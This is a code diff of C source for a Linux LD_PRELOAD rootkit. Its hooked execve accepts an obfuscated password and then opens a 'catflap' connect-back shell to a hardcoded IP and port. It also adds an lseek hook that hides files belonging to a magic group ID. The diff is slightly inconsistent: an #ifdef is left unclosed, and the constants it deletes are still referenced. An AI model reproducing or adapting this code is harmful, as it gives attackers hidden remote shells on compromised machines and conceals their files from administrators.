@@ -16,28 +16,13 @@
 #include "utils/clean.h"
 #include "utils/catflap.h"
 #include "rkconst.h"
-
-
-#define DEBUG
-#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)
-#define CLEAN(var) clean(var, strlen(var))
-#define MAGIC "\x43\x47\x4d\x4b\x53" //imgay
-#define PROC "\x5\x5a\x58\x45\x49"
-#define MAGICGID 1337
-#define EXECPW "\x43\x44\x59\x5e\x4b\x46\x46\x4d\x4f\x44\x5e\x45\x45" 
-//installgen$
-#define SHELLPW "\x48\x46\x1b\x44\x4d" //bl1ng
-#define DEFAULT_PORT    61040
-#define IP              "1.3.3.7"
-
-
 //function pointers to hooked functions
 
 //misc
 int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
 char *(*old_fgets)(char *s, int size, FILE *stream);
 long int (*old_ptrace)(enum __ptrace_request request, ...);
-
+off_t (*old_lseek)(int fildes, off_t offset, int whence);
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
 struct dirent64 *(*old_readdir64)(DIR *dirp); 
@@ -129,40 +114,57 @@ int execve(const char *path, char *const argv[], char *const envp[])
 	printf("[!] execve hooked"); 
 	#endif
 
-	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
 	old___xstat(_STAT_VER, path, &filestat); 
-	if (owned())
-	{
+	if (owned()) 
+	{ 
 		if (argv[1] != NULL)
-		{
-			char *execpw = strdup(EXECPW); xor(execpw); 
+		{ 
+			execpw = strdup(EXECPW); xor(execpw);
 			if (!strcmp(argv[1], execpw))
-			{
+			{ 
+				#ifdef DEBUG 
+				printf("[-] password accepted\n"); 
+				#endif 
 				if (!strcmp(argv[2], "catflap"))
-				{
-					char *ip; 
-					int port;
-					scanf("callback ip address: %s", ip);
-					scanf("port: %d", &port);
-					printf("opening catflap...");
-					catflap(ip, port);	
+				{ 
+					#ifdef DEBUG 
+					printf("[!] catflap opened\n");
+					#endif
+					CLEAN(execpw);
+					catflap(IP, DEFAULT_PORT);
 				}
 			}
-			CLEAN(execpw);	
+			CLEAN(execpw);
 		}
 		return old_execve(path, argv, envp);
 	}
 	return old_execve(path, argv, envp);
-}
+}		       	
 
-		       	
+off_t lseek(int fildes, off_t offset, int whence)
+{ 
+	HOOK(lseek);
+	HOOK(__fxstat); 
+	#ifdef DEBUG 
+	printf("[!] lseek hooked\n");
+
+	if (owned()) return old_lseek(fildes, offset, whence); 
+	struct stat filestat; 
+	old___fxstat(_STAT_VER, fildes, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		errno = EBADF; 
+		return -1;
+	}
+	return old_lseek(fildes, offset, whence);
+}
 
 int stat(const char *path, struct stat *buf)
 {
 	HOOK(stat);
 	#ifdef DEBUG
-	printf("[!] stat hooked"); 
+	printf("[!] stat hooked\n"); 
 	#endif
 
 	char *magic = strdup(MAGIC); xor(magic); 
